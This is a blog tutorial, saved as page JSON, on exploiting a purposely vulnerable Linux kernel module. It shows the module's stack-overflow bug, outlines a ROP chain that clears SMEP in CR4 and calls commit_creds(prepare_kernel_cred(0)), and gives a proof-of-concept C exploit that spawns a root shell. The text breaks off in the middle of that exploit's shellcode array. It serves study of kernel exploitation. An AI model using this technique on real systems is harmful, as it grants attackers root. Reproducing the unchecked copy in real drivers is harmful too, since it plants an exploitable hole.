{"componentChunkName":"component---src-templates-post-tsx","path":"/2018-02-18-Stack-Overflow-Tutorial/","result":{"data":{"markdownRemark":{"html":"<h2 id=\"tldr\" style=\"position:relative;\"><a href=\"#tldr\" aria-label=\"tldr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TL;DR</h2>\n<p>In this article, we're going to exploit an LK module that has a stack overflow vulnerability by bypassing SMEP.</p>\n<h2 id=\"background\" style=\"position:relative;\"><a href=\"#background\" aria-label=\"background permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Background</h2>\n<p>Before we start, there're some concepts for bypassing those protections.</p>\n<ul>\n<li>SMEP/SMAP : Supervisor Mode Execution/Access Protection.</li>\n</ul>\n<p>This means userland code cannot be executed by the kernel. And its state is saved in Bit 20/21 of the CR4 register.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/2fbfa0704884a91a4d46ae7eca7d500c/c5bb3/cr4_register.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.945945945945947%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAnElEQVR42k2Oyw6DIBBF+f9P68qVaVR8EkFBU0VXhtATSJreBZkZ7ku0bTsMw77v1tppmuq67vveGMMspey6DsKyLCZhnmdoWuvjOGKMoqqqVwIapdQ74ZOAkl+sr+tCwL0sS9amacjAUWQnXBmcc9u2rev6KwKV/LzmCwEQzvMMIYj4h/u+czHvPcXgFUXBy4yM/oSP4/g8T+Z/AUsl2OLycLdzAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"CR4_Register\"\n        title=\"\"\n        src=\"/static/2fbfa0704884a91a4d46ae7eca7d500c/fcda8/cr4_register.png\"\n        srcset=\"/static/2fbfa0704884a91a4d46ae7eca7d500c/12f09/cr4_register.png 148w,\n/static/2fbfa0704884a91a4d46ae7eca7d500c/e4a3f/cr4_register.png 295w,\n/static/2fbfa0704884a91a4d46ae7eca7d500c/fcda8/cr4_register.png 590w,\n/static/2fbfa0704884a91a4d46ae7eca7d500c/c5bb3/cr4_register.png 680w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>To check whether it is activated or not, just read <em>/proc/cpuinfo</em>, then find <strong>smep</strong>.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>cpuinfo <span class=\"token operator\">|</span> grep flags\nflags\t\t<span class=\"token operator\">:</span> fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm <span class=\"token number\">3</span>dnowprefetch cpuid_fault invpcid_single pti fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 invpcid rtm mpx rdseed adx smap clflushopt xsaveopt xsavec xsaves arat\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code></pre></div>\n<p>You can see SMEP/SMAP is enabled.</p>\n<ul>\n<li>KASLR : Kernel Address Space Layout Randomization</li>\n</ul>\n<p>In every boot, the kernel base address is changed randomly. So, we need to leak its address in several ways.</p>\n<p>In this example, I just add a function that gets kernel base address for helping exploit easier.</p>\n<h2 id=\"case\" style=\"position:relative;\"><a href=\"#case\" aria-label=\"case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Case</h2>\n<p>This time, I'll give an example code that has a stack-based overflow vulnerability.\nThe testing Environment is like below.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug2$ uname <span class=\"token operator\">-</span>a\nLinux ubuntu <span class=\"token number\">4.15</span><span class=\"token number\">.4</span><span class=\"token operator\">-</span><span class=\"token number\">041504</span><span class=\"token operator\">-</span>generic #<span class=\"token number\">201802162207</span> SMP Fri Feb <span class=\"token number\">16</span> <span class=\"token number\">22</span><span class=\"token operator\">:</span><span class=\"token number\">08</span><span class=\"token operator\">:</span><span class=\"token number\">57</span> UTC <span class=\"token number\">2018</span> x86_64 x86_64 x86_64 GNU<span class=\"token operator\">/</span>Linux\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug2$ lsb_release <span class=\"token operator\">-</span>a\nNo LSB modules are available<span class=\"token punctuation\">.</span>\nDistributor ID<span class=\"token operator\">:</span>\tUbuntu\nDescription<span class=\"token operator\">:</span>\tUbuntu Bionic <span class=\"token function\">Beaver</span> <span class=\"token punctuation\">(</span>development branch<span class=\"token punctuation\">)</span>\nRelease<span class=\"token operator\">:</span>\t<span class=\"token number\">18.04</span>\nCodename<span class=\"token operator\">:</span>\tbionic\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug2$ gcc <span class=\"token operator\">-</span>q <span class=\"token operator\">-</span>v\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\ngcc version <span class=\"token number\">7.3</span><span class=\"token number\">.0</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">7.3</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">3u</span>buntu1<span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"code\" style=\"position:relative;\"><a href=\"#code\" aria-label=\"code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code</h2>\n<p>Here's a Makefile &#x26; vulnerable code.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">obj<span class=\"token operator\">-</span>m <span class=\"token operator\">+=</span> bug2<span class=\"token punctuation\">.</span>o\n\nall<span class=\"token operator\">:</span>\n\tmake <span class=\"token operator\">-</span>C <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>modules<span class=\"token operator\">/</span>$<span class=\"token punctuation\">(</span>shell uname <span class=\"token operator\">-</span>r<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>build M<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>PWD<span class=\"token punctuation\">)</span> modules\n\nclean<span class=\"token operator\">:</span>\n\tmake <span class=\"token operator\">-</span>C <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>modules<span class=\"token operator\">/</span>$<span class=\"token punctuation\">(</span>shell uname <span class=\"token operator\">-</span>r<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>build M<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>PWD<span class=\"token punctuation\">)</span> clean</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/init.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/module.h></span> </span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/proc_fs.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/kernel.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/slab.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/fs.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/cdev.h></span> </span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/device.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;asm/uaccess.h></span></span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">proc_dir_entry</span> <span class=\"token operator\">*</span>my_proc <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token class-name\">ssize_t</span> <span class=\"token function\">my_write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span>file<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> len<span class=\"token punctuation\">,</span> <span class=\"token class-name\">loff_t</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">raw_copy_from_user</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>EFAULT<span class=\"token punctuation\">;</span>\n    \n    buffer<span class=\"token punctuation\">[</span>len <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'\\0'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] write %s (%ld bytes)\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">return</span> len<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">file_operations</span> fops <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span>owner <span class=\"token operator\">=</span> THIS_MODULE<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">.</span>write <span class=\"token operator\">=</span> my_write\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> __exit <span class=\"token function\">my_exit_module</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">remove_proc_entry</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bug2\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] bug2 module unloaded\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> __init <span class=\"token function\">my_init_module</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    my_proc <span class=\"token operator\">=</span> <span class=\"token function\">proc_create</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bug2\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0666</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>fops<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>my_proc <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>ENOMEM<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] bug2 module loaded\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>    \n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">module_init</span><span class=\"token punctuation\">(</span>my_init_module<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">module_exit</span><span class=\"token punctuation\">(</span>my_exit_module<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">MODULE_LICENSE</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GPL\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">MODULE_AUTHOR</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zer0day\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>You can test a module like below to check working well.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>LK<span class=\"token operator\">/</span>bug2$ echo <span class=\"token string\">\"asdf\"</span> <span class=\"token operator\">></span> <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>bug2<span class=\"token punctuation\">;</span> dmesg <span class=\"token operator\">|</span> tail <span class=\"token operator\">-</span>n <span class=\"token number\">1</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">1096.475854</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> write <span class=\"token function\">asdf</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> bytes<span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"attack\" style=\"position:relative;\"><a href=\"#attack\" aria-label=\"attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack</h2>\n<p>Let me explain how to build a fully ROP chain for bypass SMEP/SMAP in order.</p>\n<ul>\n<li>backup userland context</li>\n</ul>\n<blockquote>\n<p>userland cs, ss, rflags, rsp</p>\n</blockquote>\n<ul>\n<li>overwrite CR4 with value 0x606e0. (remove Bit 20 of CR4 register)</li>\n</ul>\n<blockquote>\n<p>pop reg; ret; <br/></p>\n</blockquote>\n<p>\\xe0\\x06\\x06\\x00\\x00\\x00\\x00\\x00 <br/>\nmov cr4, reg; ret;</p>\n<ul>\n<li>call commit_creds(prepare_kernel_cred(0)).</li>\n</ul>\n<blockquote>\n<p>&#x26;get_root()</p>\n</blockquote>\n<ul>\n<li>swapgs;</li>\n<li>iretq; construct safe structure with userland context. And arrange registers in following order.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">swapgs<span class=\"token punctuation\">;</span>\niretq<span class=\"token punctuation\">;</span>\n<span class=\"token function\">rip</span> <span class=\"token punctuation\">(</span>to <span class=\"token operator\">&amp;</span>get_shell<span class=\"token punctuation\">)</span>\ncs\nrflags\nrsp\nss</code></pre></div>\n<p>Here's final PoC code.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span> <span class=\"token operator\">*</span>daemon<span class=\"token punctuation\">)</span><span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span>new<span class=\"token punctuation\">)</span><span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token class-name\">prepare_kernel_cred_t</span> prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token number\">0xffffffffb26ae2b0</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">commit_creds_t</span> commit_creds <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token number\">0xffffffffb26adf00</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token function\">commit_creds</span><span class=\"token punctuation\">(</span><span class=\"token function\">prepare_kernel_cred</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> user_cs <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> user_ss <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> user_rsp <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> user_rflags <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">backup_stat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  \n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\"movq %%cs, %0\\n\"</span>\n        <span class=\"token string\">\"movq %%ss, %1\\n\"</span>\n        <span class=\"token string\">\"pushfq\\n\"</span>\n        <span class=\"token string\">\"popq %2\\n\"</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"=r\"</span> <span class=\"token punctuation\">(</span>user_cs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"=r\"</span> <span class=\"token punctuation\">(</span>user_ss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"=r\"</span> <span class=\"token punctuation\">(</span>user_rflags<span class=\"token punctuation\">)</span> <span class=\"token operator\">::</span><span class=\"token string\">\"memory\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Stage 1 - Allocate 0x0\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> PROT_READ <span class=\"token operator\">|</span> PROT_WRITE <span class=\"token operator\">|</span> PROT_EXEC<span class=\"token punctuation\">,</span> MAP_ANON <span class=\"token operator\">|</span> MAP_PRIVATE <span class=\"token operator\">|</span> MAP_FIXED<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t\n\t<span class=\"token comment\">// opcodes that used in this shellcode need to be changed to gadgets.</span>\n\t<span class=\"token comment\">// y can simply get gadgets with ROPgadget tools or anything from vmlinux.</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> shellcode<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> \n        <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token 